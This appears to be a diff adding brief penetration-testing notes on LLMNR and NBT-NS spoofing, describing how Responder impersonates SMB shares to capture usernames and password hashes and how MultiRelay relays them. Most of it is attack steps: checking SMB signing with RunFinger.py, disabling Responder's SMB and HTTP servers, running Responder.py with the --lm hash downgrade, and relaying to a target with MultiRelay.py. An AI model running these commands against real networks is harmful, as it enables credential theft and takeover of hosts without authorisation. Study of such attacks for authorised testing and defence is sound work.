@@ -1,0 +1,20 @@
+MITM LLMNR and NBT-NS
+
+Responder/MultiRelay are used for hash relays
+Responder is able to spoof messages if someone accidently puts in the wrong smb information
+Responder will act as if it is the SMB share the user is looking for and obtain the username and password
+
+For this attack to work SMB signing must be disabled
+	We can see this through an NMAP scan or by using RunFinger.py
+python RunFinger.py -i <target ip>
+
+To launch responder/multirelay attack
+
+Modify the responder.conf configuration file
+set SMB server and HTTP server to off
+
+launch the responder.py with -I (interface)
+	We can also downgrade the NTML hashes if supported with --lm
+	python Responder.py -I eth0 --lm
+	Open a new terminal window
+	python MultiRelay.py -t <targetIP> -u ALL
